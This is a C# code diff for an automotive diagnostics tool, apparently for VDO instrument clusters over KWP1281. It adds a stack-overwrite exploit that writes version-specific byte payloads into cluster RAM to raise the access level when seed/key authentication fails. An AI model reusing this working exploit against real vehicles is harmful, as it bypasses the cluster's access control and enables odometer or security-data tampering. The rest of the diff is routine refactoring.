@@ -17,22 +17,137 @@ internal class VdoCluster : ICluster
             Log.WriteLine("Unknown cluster software version. EEPROM access will likely fail.");
         }
 
-        if (!RequiresSeedKey())
+        var requiresSeedKey = RequiresSeedKey();
+        if (!requiresSeedKey)
         {
             Log.WriteLine(
                 "Cluster is unlocked for ROM/EEPROM access. Skipping Seed/Key login.");
             return;
         }
 
-        SeedKeyAuthenticate(softwareVersion);
-        if (RequiresSeedKey())
+        SeedKeyAuthenticate();
+
+        requiresSeedKey = RequiresSeedKey();
+        if (requiresSeedKey)
         {
-            Log.WriteLine("Failed to unlock cluster.");
+            Log.WriteLine("Seed/Key authentication failed to unlock cluster.");
+
+            var stackSmashSucceed = TryStackSmash(softwareVersion);
+            if (!stackSmashSucceed)
+            {
+                return;
+            }
+
+            requiresSeedKey = RequiresSeedKey();
+            if (requiresSeedKey)
+            {
+                Log.WriteLine("Stack exploit failed to unlock cluster.");
+            }
         }
-        else
+
+        if (!requiresSeedKey)
         {
             Log.WriteLine("Cluster is unlocked for ROM/EEPROM access.");
         }
+    }
+
+    /// <summary>
+    /// Stack exploits for specific ROMs
+    /// </summary>
+    private static readonly Dictionary<string, (byte[] search, byte[] replace)> _stackExploits = new()
+    {
+        ["K5MJ07HH 09.00"] =
+        (
+            [0x4E, 0xE0, 0xE6, 0x21, 0x01, 0x01, 0x9A],
+            [0xE8, 0x21, 0x03, 0xC2, 0xE1, 0x00, 0x00]
+        ),
+        ["K5MJ07LM 08.10"] =
+        (
+            [0x73, 0xBC, 0xE6, 0x21, 0x01, 0x0A, 0xA4],
+            [0x7B, 0xA8]
+        ),
+        ["KB5M07HH 09.00"] =
+        (
+            [0xCF, 0xDB, 0x33, 0x21, 0x01, 0x79, 0x9B],
+            [0xF4, 0xC8]
+        ),
+        ["VQMJ07HH 08.40"] =
+        (
+            [0x93, 0xDE, 0xE6, 0x21, 0x01, 0x4F, 0x99],
+            [0xE8, 0x21, 0x03, 0x0F, 0xDC, 0xE8, 0x21, 0x01, 0x4F, 0x99]
+        ),
+        ["VQMJ07LM 08.40"] =
+        (
+            [0xE6, 0x21, 0x01],
+            [0xB4, 0xCF, 0xE6, 0x21, 0x01]
+        ),
+        ["VQMJ07LM 09.00"] =
+        (
+            [0xE6, 0x21, 0x01],
+            [0xB4, 0xCF, 0xE6, 0x21, 0x01]
+        ),
+    };
+
+    /// <summary>
+    /// Try overwriting a specific return value on the stack with one that sets the access level to
+    /// 7.
+    /// </summary>
+    /// <returns>True if an exploit attempt was made.</returns>
+    private bool TryStackSmash(string softwareVersion)
+    {
+        var foundExploit = _stackExploits.TryGetValue(softwareVersion, out var exploit);
+        if (!foundExploit)
+        {
+            return false;
+        }
+
+        Log.WriteLine("Attempting stack exploit...");
+
+        var stack = new List<byte>();
+
+        // Search the stack backwards for the desired value
+        const int readSize = 0x10;
+        for (uint baseAddress = 0x01F0; baseAddress >= 0x0100; baseAddress -= readSize)
+        {
+            var bytes = CustomReadMemory(address: baseAddress, count: readSize);
+            Log.WriteLine($"Received: {Utils.DumpBytes(bytes)}");
+            if (bytes.Count != readSize)
+            {
+                Log.WriteLine($"Error: Expected {readSize} bytes but read {bytes.Count}.");
+                return false;
+            }
+
+            stack.InsertRange(0, bytes);
+
+            var ix = Utils.FindLastIndexOf(stack, exploit.search);
+            if (ix is not null)
+            {
+                var address = baseAddress + ix;
+
+                if (address + exploit.replace.Length > 0x200)
+                {
+                    Log.WriteLine($"Error: Stack exploit would overflow the stack.");
+                    return false;
+                }
+
+                Log.WriteLine("Sending Custom \"Write RAM\" block");
+
+                var bytesToWrite = new List<byte>(
+                [
+                    0x87, // Write RAM
+                    (byte)exploit.replace.Length,
+                    (byte)(address & 0xFF),
+                    (byte)((address >> 8) & 0xFF)
+                ]);
+                bytesToWrite.AddRange(exploit.replace);
+
+                SendCustom(bytesToWrite);
+
+                return true;
+            }
+        }
+
+        return false; // Didn't find desired sequence on the stack
     }
 
     public string DumpEeprom(
@@ -101,13 +216,13 @@ internal class VdoCluster : ICluster
             (byte)((address >> 8) & 0xFF),
             (byte)((address >> 16) & 0xFF),
         ]);
-        blocks = blocks.Where(b => !b.IsAckNak).ToList();
+        blocks = [.. blocks.Where(b => !b.IsAckNak)];
         if (blocks.Count != 1)
         {
             // Permissions issue?
             return [];
         }
-        return blocks[0].Body.ToList();
+        return [.. blocks[0].Body];
     }
 
     /// <summary>
@@ -128,12 +243,12 @@ internal class VdoCluster : ICluster
             (byte)(address & 0xFF),
             (byte)((address >> 8) & 0xFF),
         ]);
-        blocks = blocks.Where(b => !b.IsAckNak).ToList();
+        blocks = [.. blocks.Where(b => !b.IsAckNak)];
         if (blocks.Count != 1)
         {
             throw new InvalidOperationException($"Custom \"Read NEC ROM\" returned {blocks.Count} blocks instead of 1");
         }
-        return blocks[0].Body.ToList();
+        return [.. blocks[0].Body];
     }
 
     public List<byte> MapEeprom()
@@ -146,9 +261,10 @@ internal class VdoCluster : ICluster
         for (ushort addr = 0; addr < 2048; addr += blockSize)
         {
             var blockBytes = _kwp1281.ReadEeprom(addr, blockSize);
-            blockBytes = Enumerable.Repeat(
-                blockBytes == null ? (byte)0 : (byte)0xFF,
-                blockSize).ToList();
+            blockBytes =
+            [
+                .. Enumerable.Repeat(blockBytes == null ? (byte)0 : (byte)0xFF, blockSize)
+            ];
             map.AddRange(blockBytes);
         }
 
@@ -177,13 +293,13 @@ internal class VdoCluster : ICluster
         return _kwp1281.ReceiveBlocks();
     }
 
-    public (bool succeeded, string? softwareVersion) Unlock()
+    public (bool succeeded, string softwareVersion) Unlock()
     {
         var versionBlocks = CustomReadSoftwareVersion();
         if (versionBlocks.Count == 0)
         {
             Log.WriteLine("Cluster did not return software version.");
-            return (succeeded: false, softwareVersion: null);
+            return (succeeded: false, softwareVersion: "");
         }
 
         // Now we need to send an unlock code that is unique to each ROM version
@@ -226,8 +342,7 @@ internal class VdoCluster : ICluster
     /// <summary>
     /// Tries to perform seed/key authentication with cluster.
     /// </summary>
-    /// <param name="softwareVersion">Software version string like "VQMJ07LM 09.00"</param>
-    public void SeedKeyAuthenticate(string? softwareVersion)
+    public void SeedKeyAuthenticate()
     {
         // Perform Seed/Key authentication
         Log.WriteLine("Sending Custom \"Seed request\" block");
@@ -239,7 +354,7 @@ internal class VdoCluster : ICluster
             Log.WriteLine($"Block: {Utils.Dump(customBlock.Body)}");
 
             var keyBytes = VdoKeyFinder.FindKey(
-                customBlock.Body.ToArray(), MaxAccessLevel);
+                [.. customBlock.Body], MaxAccessLevel);
 
             Log.WriteLine("Sending Custom \"Key response\" block");
 
